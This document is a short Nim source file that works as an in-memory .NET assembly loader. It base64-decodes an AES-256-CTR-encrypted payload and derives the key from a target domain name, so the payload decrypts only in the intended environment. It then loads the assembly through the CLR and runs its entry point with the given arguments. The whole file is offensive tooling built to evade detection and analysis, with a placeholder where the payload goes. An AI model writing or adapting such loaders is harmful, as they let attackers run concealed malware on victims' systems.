import winim/clr except `[]`
import sugar
import os
import winim/lean
import strformat
import dynlib
import base64
import streams
import nimcrypto
import nimcrypto/sysrand

var encoded = "base64encodedencryptedassembly"

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

var
    envkey: string = "TARGETDOMAIN"
    dctx: CTR[aes256]
    key: array[aes256.sizeKey, byte]
    iv: array[aes256.sizeBlock, byte]
    # HelloWorld Encrypted
    enctext: seq[byte] = toByteSeq(decode(encoded))
    dectext = newSeq[byte](len(enctext))

# Create Random IV
iv = [byte 183, 142, 238, 156, 42, 43, 248, 100, 125, 249, 192, 254, 217, 222, 133, 149]

copyMem(addr enctext[0], addr enctext[0], len(enctext))

# Expand key to 32 bytes using SHA256 as the KDF
var expandedkey = sha256.digest(envkey)
copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))

dctx.init(key, iv)
dctx.decrypt(enctext, dectext)
dctx.clear()

var assembly = load(dectext)

var cmd: seq[string]
var i = 1
while i <= paramCount():
    cmd.add(paramStr(i))
    inc(i)
echo cmd
var arr = toCLRVariant(cmd, VT_BSTR)
assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
